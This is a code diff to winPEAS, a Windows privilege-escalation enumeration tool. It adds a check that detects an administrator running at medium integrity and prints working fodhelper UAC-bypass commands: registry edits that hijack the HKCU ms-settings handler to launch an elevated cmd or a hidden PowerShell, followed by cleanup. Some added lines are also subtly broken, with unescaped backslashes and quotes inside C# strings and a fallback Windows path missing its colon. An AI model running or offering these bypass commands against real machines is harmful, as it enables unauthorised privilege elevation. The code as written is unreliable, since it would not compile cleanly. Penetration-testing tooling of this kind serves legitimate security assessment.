@@ -547,6 +547,71 @@ namespace winPEAS.Checks
 
                 if ((uacDict["EnableLUA"] == "1") && (uacDict["LocalAccountTokenFilterPolicy"] != "1") && (uacDict["FilterAdministratorToken"] == "1"))
                     Beaprint.GoodPrint("      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken == 1.\r\n      [-] No local accounts can be used for lateral movement.");
+
+                // Extra UAC bypass hints (fodhelper) when user is admin but token is not elevated
+                try
+                {
+                    bool isElevated = MyUtils.IsHighIntegrity();
+
+                    // Detect if current user token contains any indication of local Administrators membership
+                    bool inAdministrators = false;
+                    foreach (var sid in Checks.CurrentUserSiDs)
+                    {
+                        if (sid.Key == "S-1-5-32-544" || sid.Value.Equals("Administrators", System.StringComparison.OrdinalIgnoreCase) || sid.Key == "S-1-5-114")
+                        {
+                            inAdministrators = true;
+                            break;
+                        }
+                    }
+
+                    if (inAdministrators && !isElevated)
+                    {
+                        // Typical scenario for an easy UAC bypass such as fodhelper
+                        Beaprint.BadPrint("      [!] Current user belongs to Administrators but the process is not elevated (Medium integrity). A UAC bypass may be possible (e.g., fodhelper).");
+
+                        // Environment/arch info to guide Sysnative usage
+                        bool isWow64 = !System.Environment.Is64BitProcess && System.Environment.Is64BitOperatingSystem;
+                        string windir = System.Environment.GetEnvironmentVariable("windir") ?? "C\\Windows";
+                        string fodhelper = System.IO.Path.Combine(windir, "System32", "fodhelper.exe");
+                        bool fodExists = System.IO.File.Exists(fodhelper);
+
+                        Beaprint.NoColorPrint($"        OS Arch:                {(System.Environment.Is64BitOperatingSystem ? "x64" : "x86")}  |  Proc Arch: {(System.Environment.Is64BitProcess ? "x64" : "x86")}");
+                        Beaprint.NoColorPrint($"        fodhelper.exe:         {(fodExists ? fodhelper : "Not found in System32")}");
+
+                        // Check if ms-settings hijack keys already exist in HKCU
+                        string hijackKey = @"Software\\Classes\\ms-settings\\Shell\\Open\\command";
+                        string delExec = RegistryHelper.GetRegValue("HKCU", hijackKey, "DelegateExecute");
+                        string defaultCmd = RegistryHelper.GetRegValue("HKCU", hijackKey, "");
+                        if (!string.IsNullOrEmpty(delExec) || !string.IsNullOrEmpty(defaultCmd))
+                        {
+                            Beaprint.InfoPrint("        Note: HKCU ms-settings hijack key already exists. Review current values before using:");
+                            Beaprint.NoColorPrint($"          DelegateExecute:     '{delExec}'");
+                            Beaprint.NoColorPrint($"          (default):           '{defaultCmd}'");
+                        }
+
+                        // Provide actionable, architecture-aware commands
+                        string reg = isWow64 ? "%windir%\\Sysnative\\reg.exe" : "reg.exe";
+                        string fodLaunch = isWow64 ? "%windir%\\Sysnative\\fodhelper.exe" : "%windir%\\System32\\fodhelper.exe";
+                        string cmdPath = "%windir%\\System32\\cmd.exe";
+                        string ps64 = isWow64 ? "%windir%\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe" : "%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+
+                        Beaprint.LinkPrint("https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#uac-bypass-fodhelper", "fodhelper HKCU hijack quick commands");
+                        Beaprint.NoColorPrint("        Example (elevated cmd):");
+                        Beaprint.NoColorPrint("          " + reg + " add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f");
+                        Beaprint.NoColorPrint("          " + reg + " add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /t REG_SZ /d \"" + cmdPath + " /c start " + cmdPath + "\" /f");
+                        Beaprint.NoColorPrint($"          {fodLaunch}");
+                        Beaprint.NoColorPrint("        Example (elevated PowerShell):");
+                        Beaprint.NoColorPrint("          " + reg + " add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f");
+                        Beaprint.NoColorPrint("          " + reg + " add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /t REG_SZ /d \"" + ps64 + " -NoP -W Hidden -Command \\\"\\\"Start-Process " + ps64 + " -Verb runAs\\\"\\\"\" /f");
+                        Beaprint.NoColorPrint($"          {fodLaunch}");
+                        Beaprint.NoColorPrint("        Cleanup:");
+                        Beaprint.NoColorPrint("          reg delete HKCU\\Software\\Classes\\ms-settings /f");
+                    }
+                }
+                catch (System.Exception ex2)
+                {
+                    Beaprint.GrayPrint("      (UAC extra hints) " + ex2.Message);
+                }
             }
             catch (Exception ex)
             {
